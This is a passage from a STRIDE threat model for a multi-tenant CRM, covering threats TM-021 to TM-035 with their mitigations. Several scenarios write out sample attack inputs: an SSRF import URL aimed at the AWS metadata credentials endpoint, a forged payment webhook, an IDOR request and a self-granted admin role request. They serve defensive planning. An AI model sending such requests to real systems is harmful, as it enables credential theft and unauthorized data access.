**Affected Component**: CRM API, Logging System
**Asset**: PII, credentials, tokens
**OWASP Mapping**: A09:2021 - Security Logging and Monitoring Failures

**Attack Scenario**:
1. Developer logs full API request for debugging: `logger.info('Request:', JSON.stringify(req.body))`
2. Request contains password reset token or credit card number
3. Logs stored in CloudWatch/Splunk
4. Attacker (or insider) with log access finds sensitive data

**Preconditions**:
- Sensitive data logged without redaction
- Logs accessible to unauthorized parties (developers, support)

**Impact**:
- **Confidentiality**: High - Credentials, PII exposed
- **Integrity**: Low
- **Availability**: Low

**Likelihood**: High (logging sensitive data is common)
**Severity**: **MEDIUM-HIGH**

**Detection/Telemetry**:
- Log scanning tools detecting patterns (credit card regex, SSN, email+password)

**Mitigations**:

**Preventive**:
- **Redact sensitive fields** before logging: `logger.info('Request:', redact(req.body, ['password', 'token', 'ssn']))`
- **Never log**: Passwords, tokens, credit cards, SSN, full API keys
- **Log metadata only**: Log user ID, action, timestamp (not full data payload)
- **Structured logging**: Use structured log format (JSON) with explicit field allowlist

**Detective**:
- Automated log scanning for sensitive data patterns
- Data loss prevention (DLP) tools

**Responsive**:
- Purge logs containing sensitive data
- Rotate exposed credentials
- Investigate log access

**Residual Risk**: Low (with redaction)
**Owner**: Application Team
**Priority**: P1

---

### TM-021: Error Messages Exposing Internal Details

**STRIDE Category**: Information Disclosure
**Affected Component**: CRM API, Web Client
**Asset**: System internals (stack traces, database schema, file paths)
**OWASP Mapping**: A05:2021 - Security Misconfiguration

**Attack Scenario**:
1. Attacker triggers error (e.g., SQL injection attempt)
2. API returns detailed error: `500 Internal Server Error: Syntax error in SQL: SELECT * FROM contacts WHERE id='abc'; column "id" is type integer`
3. Error reveals database type (PostgreSQL), table name, column name
4. Attacker uses this information to craft more targeted attacks

**Preconditions**:
- Production environment in debug mode
- Unhandled exceptions returned to client

**Impact**:
- **Confidentiality**: Low-Medium (info leak assists attacks)
- **Integrity**: Low
- **Availability**: Low

**Likelihood**: Medium (common in poorly configured environments)
**Severity**: **MEDIUM**

**Detection/Telemetry**:
- Monitor for 500 errors with stack traces in response

**Mitigations**:

**Preventive**:
- **Generic error messages** in production: `500 Internal Server Error` (no details)
- **Detailed logging** server-side (for debugging) but not in response
- **Environment-specific error handling**: Debug mode only in development, not production
- **Custom error pages** (no stack traces)
- **Exception handling**: Catch all exceptions, log internally, return generic message

**Detective**:
- Review error responses in penetration tests
- Monitor for verbose errors

**Responsive**:
- Disable debug mode
- Review logs for what information was exposed

**Residual Risk**: Very Low (with proper error handling)
**Owner**: Application Team
**Priority**: P2

---

### TM-022: Insecure Direct Object Reference (IDOR) in File Downloads

**STRIDE Category**: Information Disclosure
**Affected Component**: CRM API, Object Storage
**Asset**: File attachments
**OWASP Mapping**: API1:2023 - Broken Object Level Authorization

**Attack Scenario**:
1. User uploads file, receives download URL: `GET /api/attachments/download/12345`
2. Attacker guesses other file IDs: `GET /api/attachments/download/12346`
3. API generates signed URL for file 12346 without checking ownership
4. Attacker downloads file belonging to different user/tenant

**Preconditions**:
- No authorization check on file download endpoint
- File IDs are sequential or predictable

**Impact**:
- **Confidentiality**: High - Unauthorized file access
- **Integrity**: Low
- **Availability**: Low

**Likelihood**: High (IDOR is common)
**Severity**: **HIGH**

**Detection/Telemetry**:
- Anomaly detection: User requesting unusual number of file downloads
- Audit logs: File access by user

**Mitigations**:

**Preventive**:
- **Authorization check**: Verify `file.tenant_id == user.tenant_id AND (file.owner_id == user.id OR user.hasPermission('view_all_files'))`
- **Use UUIDs for file IDs** (not sequential)
- **Time-limited signed URLs**: Generate pre-signed URL only after authorization check
- **Resource-level permissions**: Store file ACL in metadata

**Detective**:
- Audit logging of file access
- Anomaly detection

**Responsive**:
- Revoke signed URLs (short expiration limits damage)
- Investigate file access logs
- Fix authorization check

**Residual Risk**: Low (with authorization checks)
**Owner**: Application Team
**Priority**: P0

---

### TM-023: Timing Attack Leaking User Existence

**STRIDE Category**: Information Disclosure
**Affected Component**: CRM API (login/password reset endpoints)
**Asset**: User account enumeration
**OWASP Mapping**: A07:2021 - Identification and Authentication Failures

**Attack Scenario**:
1. Attacker submits password reset for `known-user@example.com`: Response time 200ms
2. Attacker submits password reset for `nonexistent@example.com`: Response time 50ms
3. Timing difference reveals whether email exists in system
4. Attacker enumerates valid user emails (for phishing target list)

**Preconditions**:
- Different code paths for existing vs. non-existing users
- No rate limiting on password reset endpoint

**Impact**:
- **Confidentiality**: Low (user enumeration)
- **Integrity**: Low
- **Availability**: Low

**Likelihood**: Medium (timing attacks require precision but are feasible)
**Severity**: **LOW**

**Detection/Telemetry**:
- Rapid password reset attempts from same IP

**Mitigations**:

**Preventive**:
- **Constant-time responses**: Always perform same operations (hash lookup) regardless of user existence
- **Generic messages**: "If email exists, reset link sent" (don't reveal if email exists)
- **Rate limiting**: Limit password reset attempts per IP (5 per hour)
- **CAPTCHA**: Require CAPTCHA for password reset

**Detective**:
- Monitor for enumeration attempts (many password reset requests)

**Responsive**:
- Block attacker IP
- Review accounts that were enumerated

**Residual Risk**: Low (not high impact)
**Owner**: Platform Team (IdP configuration)
**Priority**: P2

---

### TM-024: Cache Poisoning Leading to Data Leak

**STRIDE Category**: Information Disclosure
**Affected Component**: Redis Cache, CRM API
**Asset**: Cached user data, permissions
**OWASP Mapping**: A08:2021 - Software and Data Integrity Failures

**Attack Scenario**:
1. Attacker manipulates cache key via request parameter: `GET /api/users/profile?tenant_id=tenant-b`
2. API incorrectly uses `tenant_id` from query param to cache key (instead of from JWT)
3. Attacker's profile cached under Tenant B's key
4. Legitimate Tenant B user requests profile, gets Attacker's data from cache

**Preconditions**:
- Cache key includes client-controlled input
- Cache key not properly namespaced by authenticated tenant

**Impact**:
- **Confidentiality**: High - Cross-tenant data exposure
- **Integrity**: Medium - Incorrect data served
- **Availability**: Low

**Likelihood**: Low-Medium (requires cache key misconfiguration)
**Severity**: **MEDIUM-HIGH**

**Detection/Telemetry**:
- User complaints about wrong data displayed
- Cache hit rate anomalies

**Mitigations**:

**Preventive**:
- **Tenant-based cache namespacing**: Cache key always includes tenant ID from JWT: `tenant:{tenant_id}:user:{user_id}:profile`
- **Never use client input for cache keys** (except validated, sanitized values)
- **Cache key validation**: Validate cache key format before use

**Detective**:
- Monitor for cache key collisions
- User reports of incorrect data

**Responsive**:
- Flush affected cache keys
- Fix cache key generation logic

**Residual Risk**: Low (with proper cache namespacing)
**Owner**: Application Team
**Priority**: P1

---

### TM-025: Verbose API Responses Exposing Business Logic

**STRIDE Category**: Information Disclosure
**Affected Component**: CRM API
**Asset**: Business logic, internal workflows
**OWASP Mapping**: API3:2023 - Excessive Data Exposure

**Attack Scenario**:
1. API endpoint returns workflow status: `{"status": "pending_approval", "approver_id": 789, "approval_threshold": 1000, "current_total": 950}`
2. Attacker learns approval logic: Orders > $1000 require approval
3. Attacker places orders just under threshold to bypass approval
4. Business logic exploited

**Preconditions**:
- API exposes internal state and business rules
- Client does not need all this information

**Impact**:
- **Confidentiality**: Medium (business logic exposed)
- **Integrity**: Medium (enables business logic bypass)
- **Availability**: Low

**Likelihood**: Medium (APIs often over-share internal state)
**Severity**: **MEDIUM**

**Detection/Telemetry**:
- Code review of API responses
- Penetration testing

**Mitigations**:

**Preventive**:
- **Minimal API responses**: Only include fields client needs
- **Separate internal and external models**: DTO pattern
- **Business logic on server-side only**: Never expose thresholds, rules to client

**Detective**:
- API schema reviews
- Penetration testing

**Responsive**:
- Remove excessive fields from API responses
- Review business logic for bypass vulnerabilities

**Residual Risk**: Low (with DTOs)
**Owner**: Application Team
**Priority**: P2

---

### TM-026: Unencrypted Backup Exposure

**STRIDE Category**: Information Disclosure
**Affected Component**: Database Backups, Object Storage
**Asset**: All CRM data (PII, business data)
**OWASP Mapping**: A02:2021 - Cryptographic Failures

**Attack Scenario**:
1. Database backups stored in S3 without encryption
2. Attacker gains access to backup bucket (via misconfiguration or stolen credentials)
3. Attacker downloads backup and restores database locally
4. All tenant data exposed

**Preconditions**:
- Backups not encrypted
- Backup storage misconfigured (public or weak access control)

**Impact**:
- **Confidentiality**: CRITICAL - All data exposed
- **Integrity**: Low
- **Availability**: Low

**Likelihood**: Low (requires storage misconfiguration)
**Severity**: **HIGH**

**Detection/Telemetry**:
- AWS Config detecting unencrypted S3 objects
- Backup storage access logs showing unauthorized access

**Mitigations**:

**Preventive**:
- **Encrypt backups at rest**: S3 server-side encryption (SSE-S3 or SSE-KMS)
- **Encrypt backups in transit**: TLS for backup upload
- **Restrict backup access**: IAM policy allowing only backup service role
- **Separate backup account**: Store backups in different AWS account
- **Test backup restoration**: Ensure encrypted backups can be restored

**Detective**:
- AWS Config rule: `s3-default-encryption-kms`
- Monitor backup storage access logs

**Responsive**:
- Investigate unauthorized access
- Rotate encryption keys
- Notify affected parties if breach confirmed

**Residual Risk**: Very Low (with encryption and access controls)
**Owner**: Platform Team
**Priority**: P1

---

## DENIAL OF SERVICE THREATS

### TM-027: Resource Exhaustion via Expensive Queries

**STRIDE Category**: Denial of Service
**Affected Component**: CRM API, PostgreSQL Database
**Asset**: System availability
**OWASP Mapping**: API4:2023 - Unrestricted Resource Consumption

**Attack Scenario**:
1. API endpoint allows complex search: `GET /api/contacts/search?q=*&include=activities,deals,notes`
2. Attacker sends query without pagination: `GET /api/contacts/search?q=*&limit=999999`
3. Database executes expensive query joining multiple tables, returning millions of rows
4. Database CPU/memory exhausted, all requests slow down
5. Legitimate users experience timeout

**Preconditions**:
- No query complexity limits
- No pagination enforcement
- No query timeout

**Impact**:
- **Confidentiality**: Low
- **Integrity**: Low
- **Availability**: High - Service degradation or outage

**Likelihood**: Medium (attackers probe for expensive operations)
**Severity**: **MEDIUM-HIGH**

**Detection/Telemetry**:
- Slow query logs
- Database CPU/memory alerts
- API latency spikes

**Mitigations**:

**Preventive**:
- **Enforce pagination**: Maximum page size (100 results)
- **Query timeout**: Database query timeout (5 seconds)
- **Rate limiting**: Per-user, per-endpoint limits (e.g., 10 search requests per minute)
- **Query complexity analysis**: Reject queries with excessive JOINs or subqueries
- **Database connection pool limits**: Prevent query from monopolizing connections

**Detective**:
- Monitor slow queries (log queries > 1 second)
- Alert on database resource usage (CPU > 80%)

**Responsive**:
- Kill long-running queries
- Block abusive users/IPs
- Scale database resources (short-term)

**Residual Risk**: Low (with limits in place)
**Owner**: Application Team
**Priority**: P1

---

### TM-028: File Upload Abuse (Storage Exhaustion)

**STRIDE Category**: Denial of Service
**Affected Component**: CRM API, Object Storage
**Asset**: Storage capacity, costs
**OWASP Mapping**: API4:2023 - Unrestricted Resource Consumption

**Attack Scenario**:
1. Attacker uploads maximum file size (10 MB) repeatedly
2. No per-tenant storage quota enforced
3. Attacker uploads 10,000 files (100 GB)
4. Storage costs skyrocket
5. OR: Storage quota exceeded, legitimate users cannot upload

**Preconditions**:
- No per-tenant storage quota
- No file upload rate limiting
- No cost monitoring/alerts

**Impact**:
- **Confidentiality**: Low
- **Integrity**: Low
- **Availability**: High - Prevents legitimate uploads
- **Financial**: Medium - Unexpected costs

**Likelihood**: Medium (abuse of file upload is common)
**Severity**: **MEDIUM**

**Detection/Telemetry**:
- Storage usage by tenant
- File upload rate anomalies
- Cost monitoring alerts

**Mitigations**:

**Preventive**:
- **Per-tenant storage quota**: E.g., 10 GB per tenant (enforce in API)
- **File size limits**: 10 MB per file
- **Upload rate limiting**: 10 uploads per hour per user
- **File type restrictions**: Only allowed file types (no executables, archives)
- **Virus scanning**: Reject malicious files (also prevents storage abuse)

**Detective**:
- Monitor storage usage by tenant (alert on rapid growth)
- Cost anomaly detection

**Responsive**:
- Notify tenant when approaching quota
- Suspend uploads for abusive tenants
- Review and delete suspicious files

**Residual Risk**: Low (with quotas and limits)
**Owner**: Application Team + Platform Team
**Priority**: P1

---

### TM-029: Queue Flooding Attack

**STRIDE Category**: Denial of Service
**Affected Component**: Message Queue (SQS), Worker Service
**Asset**: Background job processing capacity
**OWASP Mapping**: API4:2023 - Unrestricted Resource Consumption

**Attack Scenario**:
1. Attacker discovers endpoint that enqueues jobs: `POST /api/reports/generate`
2. Attacker sends thousands of report generation requests
3. Queue fills with millions of messages
4. Workers overwhelmed, legitimate jobs delayed
5. Queue costs increase (pay-per-message)

**Preconditions**:
- No rate limiting on job enqueue endpoints
- No queue depth limits
- No cost monitoring

**Impact**:
- **Confidentiality**: Low
- **Integrity**: Low
- **Availability**: High - Legitimate jobs delayed
- **Financial**: Medium - Queue costs

**Likelihood**: Medium (if endpoint is public or accessible)
**Severity**: **MEDIUM**

**Detection/Telemetry**:
- Queue depth monitoring (alert on > 10,000 messages)
- Worker processing lag
- Cost anomaly detection

**Mitigations**:

**Preventive**:
- **Rate limiting** on job enqueue endpoints (10 reports per hour per user)
- **Queue depth limits**: Reject new messages if queue > threshold
- **Per-tenant queue quotas**: Limit messages per tenant
- **Require justification** for expensive operations (e.g., "Generate report for all 100,000 contacts?")

**Detective**:
- Monitor queue depth and age
- Alert on rapid message enqueue

**Responsive**:
- Purge malicious messages from queue
- Block abusive users
- Scale workers (short-term)

**Residual Risk**: Low (with rate limiting)
**Owner**: Application Team
**Priority**: P1

---

### TM-030: Regular Expression Denial of Service (ReDoS)

**STRIDE Category**: Denial of Service
**Affected Component**: CRM API (input validation)
**Asset**: API availability
**OWASP Mapping**: A05:2021 - Security Misconfiguration

**Attack Scenario**:
1. API validates email with regex: `^([a-zA-Z0-9]+)*@example\.com$` (vulnerable pattern)
2. Attacker sends input: `aaaaaaaaaaaaaaaaaaaaaaaaaaaa!` (crafted to cause backtracking)
3. Regex engine takes exponential time to process (catastrophic backtracking)
4. API thread blocked for seconds or minutes
5. All API threads exhausted, service unavailable

**Preconditions**:
- Vulnerable regex pattern (nested quantifiers, overlapping patterns)
- User input applied to regex without timeout
- No input length limits

**Impact**:
- **Confidentiality**: Low
- **Integrity**: Low
- **Availability**: High - API outage

**Likelihood**: Low (requires specific vulnerable regex)
**Severity**: **MEDIUM**

**Detection/Telemetry**:
- Request processing time anomalies
- CPU spike on API instances
- Timeout errors

**Mitigations**:

**Preventive**:
- **Use safe regex patterns**: Avoid nested quantifiers, use atomic groups
- **Input length limits**: Limit input to reasonable length (e.g., email max 255 chars)
- **Regex timeout**: Use regex engine with timeout (Node.js: use `safe-regex` library)
- **Prefer simple validation**: For emails, use library (validator.js) instead of complex regex

**Detective**:
- Monitor request processing time
- Alert on regex execution time > 100ms

**Responsive**:
- Replace vulnerable regex
- Kill stuck processes
- Restart API instances

**Residual Risk**: Very Low (with safe regex and timeouts)
**Owner**: Application Team
**Priority**: P2

---

### TM-031: Distributed Denial of Service (DDoS) Attack

**STRIDE Category**: Denial of Service
**Affected Component**: API Gateway, WAF, Infrastructure
**Asset**: System availability
**OWASP Mapping**: N/A (infrastructure-level threat)

**Attack Scenario**:
1. Attacker uses botnet to send millions of requests per second to API Gateway
2. Infrastructure overwhelmed (network bandwidth, connection limits)
3. Legitimate users cannot access service
4. Service outage

**Preconditions**:
- No DDoS protection
- Insufficient infrastructure capacity

**Impact**:
- **Confidentiality**: Low
- **Integrity**: Low
- **Availability**: CRITICAL - Complete outage

**Likelihood**: Medium (DDoS attacks are common for high-value targets)
**Severity**: **HIGH**

**Detection/Telemetry**:
- Traffic volume spikes
- Request rate anomalies
- Infrastructure metrics (CPU, bandwidth saturation)

**Mitigations**:

**Preventive**:
- **Cloud DDoS protection**: AWS Shield, Cloudflare, Azure DDoS Protection
- **Auto-scaling**: Scale infrastructure to absorb attack (costly but effective)
- **Rate limiting**: Aggressive rate limits during attack
- **Geo-blocking**: Block traffic from countries not in customer base (if applicable)
- **CDN**: Use CDN for static assets (offload traffic)

**Detective**:
- Real-time traffic monitoring
- DDoS detection tools

**Responsive**:
- Activate DDoS mitigation service
- Block attack traffic at edge (Cloudflare, AWS Shield)
- Communicate outage to customers
- Post-mortem and mitigation tuning

**Residual Risk**: Low-Medium (cloud DDoS protection is effective, but sophisticated attacks still possible)
**Owner**: Platform Team
**Priority**: P1

---

## ELEVATION OF PRIVILEGE THREATS

### TM-032: Privilege Escalation via RBAC Misconfiguration

**STRIDE Category**: Elevation of Privilege
**Affected Component**: CRM API, Authorization System
**Asset**: User roles, admin functions
**OWASP Mapping**: A01:2021 - Broken Access Control

**Attack Scenario**:
1. Sales rep user discovers API endpoint: `POST /api/admin/users/{id}/set-role`
2. Endpoint intended for admins only but does not check role
3. User sends: `POST /api/admin/users/self/set-role` with body `{"role": "admin"}`
4. API grants admin role
5. User now has admin privileges

**Preconditions**:
- Admin endpoints lack role-based authorization check
- Role changes not audited

**Impact**:
- **Confidentiality**: High - Admin can access all tenant data
- **Integrity**: High - Admin can modify/delete data
- **Availability**: Medium - Admin can disrupt service

**Likelihood**: Medium (RBAC misconfigurations are common)
**Severity**: **HIGH**

**Detection/Telemetry**:
- Audit logs: Role changes
- Alert on privilege escalation events

**Mitigations**:

**Preventive**:
- **Role-based authorization checks** on ALL admin endpoints: `if (!user.hasRole('admin')) return 403;`
- **Centralized authorization**: Use authorization framework (Casbin, Oso)
- **Principle of least privilege**: Default role is most restrictive
- **Immutable admin role**: Admin role can only be granted via out-of-band process (not via API)

**Detective**:
- Audit logging of role changes
- Alert on any role escalation
- Periodic RBAC reviews

**Responsive**:
- Revoke unauthorized admin access
- Investigate how escalation occurred
- Review all actions taken by escalated user

**Residual Risk**: Low (with proper authorization checks)
**Owner**: Application Team
**Priority**: P0

---

### TM-033: SSRF via Import from URL Feature

**STRIDE Category**: Elevation of Privilege (or Information Disclosure)
**Affected Component**: Worker Service
**Asset**: Internal network resources, cloud metadata
**OWASP Mapping**: A10:2021 - Server-Side Request Forgery (SSRF)

**Attack Scenario**:
1. CRM allows importing contacts from URL: `POST /api/contacts/import` with body `{"url": "http://example.com/contacts.csv"}`
2. Attacker provides URL: `{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/worker-role"}`
3. Worker fetches URL (AWS metadata endpoint)
4. Metadata response contains temporary AWS credentials
5. Attacker gains AWS access

**Alternate Scenario**: Access internal services (databases, admin panels) not exposed to internet

**Preconditions**:
- Feature allows fetching arbitrary URLs
- No URL allowlist or validation
- Worker has network access to internal resources

**Impact**:
- **Confidentiality**: High - Access to internal resources, credentials
- **Integrity**: High - Can modify internal systems
- **Availability**: Medium

**Likelihood**: Medium (if URL import feature exists)
**Severity**: **HIGH**

**Detection/Telemetry**:
- Worker outbound requests to unusual IPs
- Access to cloud metadata endpoint (alert on 169.254.169.254)

**Mitigations**:

**Preventive**:
- **URL allowlist**: Only allow specific trusted domains
- **Block private IP ranges**: Reject URLs pointing to RFC1918 (10.x, 192.168.x, 172.16.x) and metadata (169.254.x)
- **Network segmentation**: Worker cannot access internal networks
- **Disable cloud metadata access**: Use IMDSv2 (requires token) on AWS
- **Use proxy**: Fetch URLs via proxy that blocks internal IPs

**Detective**:
- Monitor worker network connections
- Alert on metadata endpoint access

**Responsive**:
- Revoke exposed credentials (if metadata was accessed)
- Block attacker
- Fix URL validation

**Residual Risk**: Low (with URL allowlist and IP blocking)
**Owner**: Application Team
**Priority**: P0 (if feature exists)

---

### TM-034: Insecure Admin Impersonation Feature

**STRIDE Category**: Elevation of Privilege
**Affected Component**: Admin Portal, CRM API
**Asset**: Tenant data, user sessions
**OWASP Mapping**: A01:2021 - Broken Access Control

**Attack Scenario**:
1. Admin impersonation feature allows support to "login as user"
2. Impersonation does not require MFA or justification
3. Malicious admin impersonates high-value tenant admin
4. Exfiltrates sensitive data
5. No audit trail of what admin did during impersonation

**Preconditions**:
- Impersonation feature lacks controls (MFA, approval, logging)
- Admin can impersonate any user without oversight

**Impact**:
- **Confidentiality**: High - Admin accesses tenant data
- **Integrity**: High - Admin can modify data as user
- **Availability**: Low

**Likelihood**: Low-Medium (insider threat)
**Severity**: **HIGH**

**Detection/Telemetry**:
- Audit logs of impersonation events
- User complaints about unauthorized actions

**Mitigations**:

**Preventive**:
- **MFA required** for impersonation
- **Justification required**: Admin must provide ticket number, reason
- **Time-limited impersonation**: Sessions expire after 30 minutes
- **Read-only by default**: Impersonation grants view access only; write requires separate approval
- **Approval workflow**: High-privilege impersonation requires second admin approval

**Detective**:
- **Comprehensive audit logging**: Log impersonation start, end, all actions taken, reason
- **Real-time alerts**: Security team notified of all impersonation events
- **User notifications**: Email user when admin impersonates their account

**Responsive**:
- Review impersonation logs during security incidents
- Revoke admin access if abuse detected

**Residual Risk**: Low-Medium (insider threat difficult to eliminate)
**Owner**: Application Team + Security Team
**Priority**: P0

---

### TM-035: Privilege Escalation via Webhook Manipulation

**STRIDE Category**: Elevation of Privilege
**Affected Component**: CRM API (webhook receiver), Payment Provider
**Asset**: Subscription status, billing
**OWASP Mapping**: A04:2021 - Insecure Design

**Attack Scenario**:
1. Platform receives webhooks from Stripe: `payment.succeeded`, `subscription.canceled`
2. Webhook handler does not validate signature
3. Attacker sends fake webhook: `POST /api/webhooks/stripe` with body `{"event": "payment.succeeded", "subscription_id": "sub_123"}`
4. API grants subscription benefits without payment
5. Attacker gains premium features for free

**Preconditions**:
- Webhook signature validation missing or broken
- Webhook events trusted without verification

**Impact**:
- **Confidentiality**: Low
- **Integrity**: High - Unauthorized feature access, financial loss
- **Availability**: Low

**Likelihood**: Medium (webhook validation often overlooked)
**Severity**: **MEDIUM-HIGH**

**Detection/Telemetry**:
- Webhook events without corresponding Stripe dashboard entries
- Anomaly in subscription activations

**Mitigations**:

**Preventive**:
- **Webhook signature validation**: Verify HMAC signature on ALL incoming webhooks (Stripe, SendGrid)
- **Use unique webhook secrets**: Rotate webhook signing keys regularly
- **Idempotency**: Check event ID against processed events (prevent replay)
- **Verify with API**: For critical events (payment succeeded), query Stripe API to confirm

**Detective**:
- Log all webhook events
- Compare webhook events with payment provider dashboard

**Responsive**:
- Revoke fraudulently granted access
- Investigate webhook source
- Rotate webhook secrets

**Residual Risk**: Very Low (with signature validation)
**Owner**: Application Team
**Priority**: P1

---

## Summary

This threat model identified **35 distinct threats** across the multi-tenant CRM application, categorized by STRIDE:

- **15 High-severity threats** requiring immediate attention (P0-P1)
- **16 Medium-severity threats** to address in near term (P1-P2)
- **4 Low-severity threats** for longer-term hardening (P2)

**Critical Focus Areas**:
1. **Tenant Isolation** (TM-017, TM-007, TM-012, TM-019) - Prevent cross-tenant data access
2. **Authentication & Authorization** (TM-001, TM-002, TM-003, TM-032) - Protect account access
3. **Input Validation** (TM-007, TM-008, TM-009, TM-011) - Prevent injection attacks
4. **Audit Logging** (TM-013, TM-014, TM-015) - Enable detection and forensics
5. **Rate Limiting & DoS Protection** (TM-027, TM-028, TM-029, TM-031) - Ensure availability

**Next Steps**:
1. Review [Security Requirements Checklist](06-security-requirements-checklist.md) for implementation guidance
2. Prioritize mitigations using [Mitigation Roadmap](07-mitigations-roadmap.md)
3. Integrate threat testing into CI/CD pipeline

---

**Related Documents**:
- [Threat Tables (Markdown)](../tables/threats.md)
- [Threat Tables (CSV)](../tables/threats.csv)
- [Security Requirements Checklist](06-security-requirements-checklist.md)
- [Mitigation Roadmap](07-mitigations-roadmap.md)
